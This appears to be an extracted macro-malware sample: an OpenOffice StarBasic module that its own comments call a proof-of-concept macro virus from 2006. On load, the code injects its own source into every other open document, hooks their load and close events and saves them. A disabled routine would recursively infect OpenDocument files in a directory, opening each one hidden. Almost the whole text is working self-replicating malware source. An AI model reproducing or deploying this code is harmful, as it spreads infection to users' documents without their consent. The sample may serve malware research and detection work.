Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic">REM  **************************************************************
Rem  ***** Prueba de concepto de macro virus para OpenOffice ******
Rem  ***** OpenOfficentzako birus baten kontzeptu-froga      ******
Rem  *****            gak egina. - 2006/06                   ******
Rem  **************************************************************

Dim strModName As String
Dim strModSource As String
Dim EndMacro As Boolean

Sub Main()
OnLoad
End Sub

Sub OnClose()
    EndMacro = True
End Sub

Sub OnLoad()
Dim arr()
Dim bLibs As Object
Dim xLib As Object
bLibs = ThisComponent.BasicLibraries
EndMacro = False
StatusBar = ThisComponent.CurrentController.StatusIndicator
statusbar.start("Documento cargado - gak egina",0)

xLib = bLibs.getByName("Standard")
arr() = xLib.getElementNames()

For i = LBound(arr()) To UBound(arr())
 If InStr(xLib.getByName(arr(i)), "gak egina") <> 0 Then
    strModSource = xLib.getByName(arr(i))
    strModName = arr(i)
     Exit For
 End If
Next i

' Get all the open documents and modify them
docCom = StarDesktop.getComponents()
docEnum = docCom.createEnumeration()
Do While docEnum.hasMoreElements()
    oDoc = docEnum.nextElement()
    If oDoc.URL <> ThisComponent.URL Then infect (oDoc, oDoc.URL, True)
Loop

'Search for OO files
'ReadDirs("/tmp/lab/")

End Sub


Function ReadDirs(path As String)
 Dim list()

' On error resume next

 listDir = createUnoService("com.sun.star.ucb.SimpleFileAccess")
 
 list() = listDir.getFolderContents(ConvertToURL(path), True)
   For i = LBound(list()) To UBound(list())
    If EndMacro = True Then Exit Function
      FName = ConvertFromURL(list(i))
      
      xfname = ConvertToURL(FName)
      If GetAttr(xfname) = 0 Then
        If Right(xfname, 3) = "odt" Or Right(xfname, 3) = "odp" Or Right(xfname, 3) = "ods" Or Right(xfname, 3) = "odg" Then
            infect (null, xfname, False)
        End If
      Else
        If listDir.Exists(FName) = True Then
            ReadDirs (FName)
        End If
      End If
      wait 50
   Next i
   
   
End Function


Function infect(OpenDoc As Object, path As String, IsDocument As Boolean)
Dim Doc As Object
Dim strRnd As String
Dim args(0) As New com.sun.star.beans.PropertyValue
Dim PropValue(1) As New com.sun.star.beans.PropertyValue
Dim PropValue1(1) As New com.sun.star.beans.PropertyValue
'  On Error Resume next

args(0).Name = "Hidden"
args(0).Value = True
  
Randomize

strRnd = CStr(Int(Rnd * 999)) & CStr(Int(Rnd * 999)) & CStr(Int(Rnd * 999))

If IsDocument = False Then
    Doc = StarDesktop.loadcomponentFromUrl(path, "_blank", 0, args())
Else
    Doc = OpenDoc
End If

If getInfected(Doc) = True Then Exit Function

If Not Doc.BasicLibraries.HasByName("Standard") Then
    Doc.BasicLibraries.CreateLibrary ("Standard", "", "", "")
End If

Doc.BasicLibraries.LoadLibrary ("Standard")
oLib = Doc.BasicLibraries.getByName("Standard")

If Not Doc.BasicLibraries.HasByName(strRnd) Then
    oLib.insertByName(strRnd, strModSource)
Else
    oLib.replaceByName(strRnd, strmodSource)
End If

PropValue(0).Name = "EventType"
PropValue(0).Value = "StarBasic"
PropValue(1).Name = "MacroName"
PropValue(1).Value = "Standard." & strRnd & ".OnLoad"
Doc.Events.replaceByName("OnLoad", PropValue())

PropValue(0).Name = "EventType"
PropValue(0).Value = "StarBasic"
PropValue(1).Name = "MacroName"
PropValue(1).Value = "Standard." & strRnd & ".OnClose"
Doc.Events.replaceByName("OnPrepareUnload", PropValue())
Doc.store()

If IsDocument = False Then
    If hasUnoInterfaces(Doc, "com.sun.star.util.XCloseable") Then
        Doc.Close (True)
    Else
        Doc.dispose
    End If
End If

End Function

Function getInfected(Doc As Object) As Boolean
Dim arr()
Dim bLibs As Object
Dim xLib As Object
bLibs = Doc.BasicLibraries
xLib = bLibs.getByName("Standard")
arr() = xLib.getElementNames()
For i = LBound(arr()) To UBound(arr())
 If InStr(xLib.getByName(arr(i)), "gak egina") <> 0 Then
    getInfected() = True
    Exit For
 End If
Next i
 getInfected() = False
End Function
</script:module>


INQUEST-PP=macro
